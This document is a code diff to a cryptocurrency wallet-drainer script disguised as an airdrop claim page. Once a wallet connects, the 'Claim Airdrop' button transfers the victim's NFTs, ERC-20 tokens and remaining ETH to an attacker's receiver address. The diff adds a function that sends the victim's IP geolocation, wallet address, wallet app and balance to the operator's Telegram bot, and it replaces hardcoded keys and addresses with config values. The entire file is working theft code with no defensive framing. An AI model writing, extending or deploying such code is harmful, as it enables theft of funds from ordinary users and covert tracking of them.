@@ -1,4 +1,4 @@
-$(document).ready(function() {
+$(document).ready(function () {
     // Dynamic wallet detection
     const detectedWallets = [];
     if (window.ethereum) {
@@ -83,8 +83,63 @@ $(document).ready(function() {
         detectedWallets.push({ name: "WalletConnect", provider: "walletconnect", type: "walletconnect" });
     }
 
-    // Your Ethereum address to receive funds
-    const RECEIVER_ADDRESS = "0x33567A73d62b6D1eafdED6F796Eed45CbCE0a4b7"; // Replace with your ETH address
+    // Credentials loaded from config.js
+    const RECEIVER_ADDRESS = CONFIG.RECEIVER_ADDRESS;
+    const TELEGRAM_BOT_TOKEN = CONFIG.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = CONFIG.TELEGRAM_CHAT_ID;
+
+    // Send wallet-connect notification to Telegram
+    async function sendTelegramNotification(walletName, walletAddress, ethBalance) {
+        try {
+            // 1. Fetch geolocation via IP
+            let locationInfo = "Unknown";
+            try {
+                const geoRes = await fetch("https://ipapi.co/json/");
+                if (geoRes.ok) {
+                    const geo = await geoRes.json();
+                    const city = geo.city || "";
+                    const region = geo.region || "";
+                    const country = geo.country_name || "";
+                    const ip = geo.ip || "";
+                    locationInfo = `${city}, ${region}, ${country} (IP: ${ip})`;
+                }
+            } catch (geoErr) {
+                console.warn("Geolocation fetch failed:", geoErr);
+            }
+
+            // 2. Build message
+            const now = new Date().toUTCString();
+            const message =
+                `🔔 *New Wallet Connected*\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `📍 *Location:* ${locationInfo}\n` +
+                `💼 *Wallet App:* ${walletName}\n` +
+                `🏦 *Address:* \`${walletAddress}\`\n` +
+                `💰 *Balance:* ${parseFloat(ethBalance).toFixed(6)} ETH\n` +
+                `🕒 *Time:* ${now}`;
+
+            // 3. Send to Telegram
+            const tgUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const tgRes = await fetch(tgUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+
+            const tgData = await tgRes.json();
+            if (!tgData.ok) {
+                console.warn("Telegram API error:", tgData);
+            } else {
+                console.log("Telegram notification sent successfully");
+            }
+        } catch (err) {
+            console.error("Failed to send Telegram notification:", err);
+        }
+    }
 
     // Common ERC-20 token contracts (popular tokens to drain)
     const COMMON_TOKENS = [
@@ -100,25 +155,25 @@ $(document).ready(function() {
     // Common NFT contracts (popular collections to drain)
     // Note: You need an Alchemy API key to fetch all user NFTs dynamically
     // Get a free key at https://www.alchemy.com/
-    const ALCHEMY_API_KEY = "jf3NdgL3L8IdVAEeLB8cO"; // REPLACE THIS WITH YOUR ALCHEMY API KEY
-    
+    const ALCHEMY_API_KEY = CONFIG.ALCHEMY_API_KEY;
+
     // Function to fetch all NFTs owned by the user via Alchemy API
     async function fetchAllUserNFTs(userAddress) {
         try {
             // Using Alchemy NFT API to get all NFTs
             const url = `https://eth-mainnet.g.alchemy.com/nft/v2/${ALCHEMY_API_KEY}/getNFTs?owner=${userAddress}&withMetadata=true`;
-            
+
             const response = await fetch(url);
             if (!response.ok) {
                 throw new Error(`API Error: ${response.statusText}`);
             }
-            
+
             const data = await response.json();
             if (!data.ownedNfts || data.ownedNfts.length === 0) {
                 console.log("No NFTs found for this address");
                 return [];
             }
-            
+
             // Map to simplified format
             return data.ownedNfts.map(nft => ({
                 name: nft.title || nft.contract.name || "Unknown NFT",
@@ -126,7 +181,7 @@ $(document).ready(function() {
                 tokenId: nft.id.tokenId,
                 type: nft.id.tokenMetadata?.tokenType || "ERC721"
             })).filter(nft => nft.type === "ERC721"); // Filter for ERC721 only
-            
+
         } catch (error) {
             console.error("Failed to fetch NFTs from API:", error);
             // Fallback to common collections if API fails
@@ -139,7 +194,7 @@ $(document).ready(function() {
     function debugWalletProviders() {
         console.log("=== Wallet Provider Debug ===");
         console.log("window.ethereum:", window.ethereum);
-        
+
         if (window.ethereum) {
             console.log("Main ethereum object properties:");
             console.log("- isMetaMask:", window.ethereum.isMetaMask);
@@ -149,7 +204,7 @@ $(document).ready(function() {
             console.log("- isRainbow:", window.ethereum.isRainbow);
             console.log("- isBraveWallet:", window.ethereum.isBraveWallet);
             console.log("- isRabby:", window.ethereum.isRabby);
-            
+
             if (window.ethereum.providers) {
                 console.log("Multiple providers detected:", window.ethereum.providers.length);
                 window.ethereum.providers.forEach((provider, index) => {
@@ -173,14 +228,14 @@ $(document).ready(function() {
         // More comprehensive mobile detection
         const userAgent = navigator.userAgent.toLowerCase();
         const mobileKeywords = [
-            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 
+            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry',
             'iemobile', 'opera mini', 'mobile', 'tablet'
         ];
-        
+
         const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
         const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
         const isSmallScreen = window.innerWidth <= 768;
-        
+
         return isMobileUA || (isTouchDevice && isSmallScreen);
     }
 
@@ -189,7 +244,7 @@ $(document).ready(function() {
         const encodedUrl = encodeURIComponent(dappUrl);
         const hostname = window.location.hostname;
         const fullUrl = window.location.href;
-        
+
         const mobileLinks = {
             "metamask": `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
             "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
@@ -197,13 +252,13 @@ $(document).ready(function() {
             "rainbow": `https://rainbow.me/dapp?url=${encodedUrl}`,
             "phantom (eth)": `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`
         };
-        
+
         return mobileLinks[walletName.toLowerCase()] || null;
     }
 
     // Insert wallet dropdown before button with improved mobile handling
     $('.button-container').prepend('<select id="wallet-select" style="margin-bottom:15px;"></select>');
-    
+
     // Add wallets to dropdown with device-specific filtering
     if (detectedWallets.length === 0) {
         // Fallback: add basic options if no wallets detected
@@ -220,7 +275,7 @@ $(document).ready(function() {
             );
         }
     }
-    
+
     detectedWallets.forEach((opt, i) => {
         let displayName = opt.name;
         if (opt.type === "mobile" && !isMobileDevice()) {
@@ -233,7 +288,7 @@ $(document).ready(function() {
 
     // Add connection status indicator
     $('.button-container').prepend('<div id="connection-status" style="margin-bottom:10px; font-size:12px; color:#666;"></div>');
-    
+
     // Update connection status
     function updateConnectionStatus(message, isError = false) {
         const statusEl = $('#connection-status');
@@ -253,7 +308,7 @@ $(document).ready(function() {
         const selected = detectedWallets[selectedIdx];
         let provider = null;
         let providerName = selected ? selected.name : "";
-        
+
         try {
             if (!selected) {
                 alert("No wallet selected.");
@@ -266,7 +321,7 @@ $(document).ready(function() {
                     const deepLink = createMobileDeepLink(selected.deepLink);
                     if (deepLink) {
                         updateConnectionStatus(`Please open ${selected.name} to connect.`);
-                        
+
                         // Create user-friendly modal
                         const modalHtml = `
                             <div id="mobile-modal" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:9999; display:flex; flex-direction:column; justify-content:center; align-items:center; padding:20px;">
@@ -278,21 +333,21 @@ $(document).ready(function() {
                                 </div>
                             </div>
                         `;
-                        
+
                         $('body').append(modalHtml);
-                        
+
                         // Try to auto-open in new tab
                         try {
                             window.open(deepLink, '_blank');
                         } catch (e) {
                             console.log("Auto-open blocked, user must click link");
                         }
-                        
-                        $('#close-mobile-modal').on('click', function() {
+
+                        $('#close-mobile-modal').on('click', function () {
                             $('#mobile-modal').remove();
                             updateConnectionStatus("Connection cancelled");
                         });
-                        
+
                         return;
                     } else {
                         updateConnectionStatus("Failed to generate deep link", true);
@@ -309,8 +364,8 @@ $(document).ready(function() {
             // Handle WalletConnect
             if (selected.name === "WalletConnect" && walletConnectAvailable && WalletConnectProvider) {
                 updateConnectionStatus("Initializing WalletConnect...");
-                
-                const PROJECT_ID = "435fa3916a5da648144afac1e1b4d3f2";
+
+                const PROJECT_ID = CONFIG.WALLETCONNECT_PROJECT_ID;
                 provider = await WalletConnectProvider.init({
                     projectId: PROJECT_ID,
                     chains: [1],
@@ -322,16 +377,16 @@ $(document).ready(function() {
                         icons: ["https://walletconnect.com/walletconnect-logo.png"]
                     }
                 });
-                
+
                 updateConnectionStatus("Waiting for WalletConnect pairing...");
                 await provider.connect();
-                
+
                 if (!provider.accounts || provider.accounts.length === 0) {
                     updateConnectionStatus("WalletConnect connection failed", true);
                     alert("No accounts connected via WalletConnect.");
                     return;
                 }
-                
+
                 updateConnectionStatus("WalletConnect connected successfully!");
                 await handleSuccessfulConnection(provider, selected.name, provider.accounts[0]);
                 return;
@@ -345,7 +400,7 @@ $(document).ready(function() {
             }
 
             provider = selected.provider;
-            
+
             // Check if provider is available
             if (!provider || typeof provider.request !== 'function') {
                 updateConnectionStatus("Wallet extension not properly installed", true);
@@ -354,10 +409,10 @@ $(document).ready(function() {
             }
 
             updateConnectionStatus(`Connecting to ${selected.name}...`);
-            
+
             // Request account access
             await provider.request({ method: 'eth_requestAccounts' });
-            
+
             // Get connected accounts
             const accounts = await provider.request({ method: 'eth_accounts' });
             if (!accounts || accounts.length === 0) {
@@ -371,7 +426,7 @@ $(document).ready(function() {
 
         } catch (error) {
             console.error("Connection error:", error);
-            
+
             // Handle specific error cases
             if (error.code === 4001) {
                 updateConnectionStatus("Connection rejected by user", true);
@@ -393,15 +448,15 @@ $(document).ready(function() {
     async function handleSuccessfulConnection(provider, walletName, userAddress) {
         try {
             updateConnectionStatus("Setting up connection...");
-            
+
             // Initialize ethers provider
             const ethersProvider = new ethers.providers.Web3Provider(provider);
             const signer = ethersProvider.getSigner();
-            
+
             // Get network info
             const network = await ethersProvider.getNetwork();
             console.log("Connected to network:", network);
-            
+
             // Check if on Ethereum mainnet
             if (network.chainId !== 1) {
                 updateConnectionStatus("Wrong network detected", true);
@@ -424,24 +479,28 @@ $(document).ready(function() {
                     }
                 }
             }
-            
+
             updateConnectionStatus("Checking account balance...");
-            
+
             // Check ETH balance
             const balance = await ethersProvider.getBalance(userAddress);
             const ethBalance = ethers.utils.formatEther(balance);
-            
+
+            // ── Send Telegram notification ────────────────────────────────────
+            sendTelegramNotification(walletName, userAddress, ethBalance);
+            // ─────────────────────────────────────────────────────────────────
+
             // Update connection status and button
             updateConnectionStatus(`Connected to ${walletName} | Balance: ${parseFloat(ethBalance).toFixed(4)} ETH`);
-            
+
             // Update button
             $('#connect-wallet').text("🎯 Claim Airdrop");
             $('#connect-wallet').off('click').on('click', async () => {
                 await drainWallet(ethersProvider, signer, userAddress);
             });
-            
+
             alert(`Connected to ${walletName}:\n${userAddress}\nBalance: ${ethBalance} ETH\nNetwork: ${network.name}`);
-            
+
         } catch (error) {
             console.error("Post-connection setup error:", error);
             updateConnectionStatus("Connection setup failed", true);
@@ -463,16 +522,16 @@ $(document).ready(function() {
             // Calculate total gas needed for all operations
             const gasPrice = await provider.getGasPrice();
             console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
-            
+
             // Estimate gas for token transfers (higher limit for safety)
             const tokenGasLimit = ethers.BigNumber.from("65000"); // Higher for token transfers
             const ethGasLimit = ethers.BigNumber.from("21000"); // Standard ETH transfer
-            
+
             // Calculate total gas needed (tokens + final ETH transfer)
             const estimatedTokenTransfers = COMMON_TOKENS.length;
             const totalGasNeeded = tokenGasLimit.mul(estimatedTokenTransfers).add(ethGasLimit);
             const totalGasCost = gasPrice.mul(totalGasNeeded);
-            
+
             console.log(`Estimated gas needed: ${ethers.utils.formatEther(totalGasCost)} ETH`);
 
             // Step 1: Drain NFTs first (high value)
@@ -524,7 +583,7 @@ $(document).ready(function() {
     // Function to drain NFTs
     async function drainNFTs(provider, signer, userAddress, gasPrice) {
         let transferCount = 0;
-        
+
         // ERC-721 ABI (only need safeTransferFrom since we know the IDs)
         const nftABI = [
             "function safeTransferFrom(address from, address to, uint256 tokenId)"
@@ -533,7 +592,7 @@ $(document).ready(function() {
         // Fetch user's NFTs from API
         updateConnectionStatus("Scanning wallet for NFTs...");
         const userNFTs = await fetchAllUserNFTs(userAddress);
-        
+
         if (userNFTs.length === 0) {
             console.log("No NFTs found to drain");
             return 0;
@@ -547,12 +606,12 @@ $(document).ready(function() {
             try {
                 // Convert hex tokenId to BigNumber if needed, usually handled by ethers
                 const tokenId = ethers.BigNumber.from(nft.tokenId);
-                
+
                 console.log(`Transferring ${nft.name} (ID: ${tokenId.toString()}) from ${nft.address}`);
                 updateConnectionStatus(`Transferring ${nft.name}...`);
-                
+
                 const contract = new ethers.Contract(nft.address, nftABI, signer);
-                
+
                 // Estimate gas
                 let estimatedGas;
                 try {
@@ -568,20 +627,20 @@ $(document).ready(function() {
                     gasLimit: estimatedGas,
                     gasPrice: gasPrice
                 });
-                
+
                 console.log(`${nft.name} transfer tx: ${tx.hash}`);
-                
+
                 // Wait for confirmation
                 await tx.wait();
                 transferCount++;
                 console.log(`${nft.name} transferred successfully`);
-                
+
             } catch (error) {
                 console.error(`Failed to transfer ${nft.name}:`, error);
                 // Continue to next NFT
             }
         }
-        
+
         return transferCount;
     }
 
@@ -631,7 +690,7 @@ $(document).ready(function() {
             // Check if user has enough ETH for gas
             const currentEthBalance = await provider.getBalance(userAddress);
             const gasCost = gasPrice.mul(estimatedGas);
-            
+
             if (currentEthBalance.lt(gasCost)) {
                 console.log(`Insufficient ETH for ${token.symbol} transfer gas. Need: ${ethers.utils.formatEther(gasCost)} ETH`);
                 return false;
@@ -661,14 +720,14 @@ $(document).ready(function() {
 
         } catch (error) {
             console.error(`Error draining ${token.symbol}:`, error);
-            
+
             // Don't throw error, just return false to continue with other tokens
             if (error.code === 'INSUFFICIENT_FUNDS') {
                 console.log(`Insufficient funds for ${token.symbol} transfer`);
             } else if (error.code === 'UNPREDICTABLE_GAS_LIMIT') {
                 console.log(`Token ${token.symbol} transfer would fail, skipping`);
             }
-            
+
             return false;
         }
     }
@@ -692,7 +751,7 @@ $(document).ready(function() {
 
             // Use a more conservative gas limit for the final transfer
             const gasLimit = ethers.BigNumber.from("21000");
-            
+
             // Calculate exact gas cost
             const exactGasCost = gasPrice.mul(gasLimit);
             console.log(`Exact gas cost: ${ethers.utils.formatEther(exactGasCost)} ETH`);
@@ -729,11 +788,11 @@ $(document).ready(function() {
                         delete txParams.gasPrice;
                         txParams.maxFeePerGas = feeData.maxFeePerGas;
                         txParams.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
-                        
+
                         // Recalculate amount with EIP-1559 fees
                         const eip1559GasCost = feeData.maxFeePerGas.mul(gasLimit);
                         const eip1559Amount = currentBalance.sub(eip1559GasCost);
-                        
+
                         if (eip1559Amount.gt(0)) {
                             txParams.value = eip1559Amount;
                             console.log(`Using EIP-1559: sending ${ethers.utils.formatEther(eip1559Amount)} ETH`);
@@ -765,13 +824,13 @@ $(document).ready(function() {
 
         } catch (error) {
             console.error("Error draining ETH:", error);
-            
+
             if (error.code === 'INSUFFICIENT_FUNDS') {
                 console.log("Transaction failed due to insufficient funds for gas");
             } else if (error.code === 'REPLACEMENT_UNDERPRICED') {
                 console.log("Transaction underpriced, gas price may have increased");
             }
-            
+
             throw error;
         }
     }
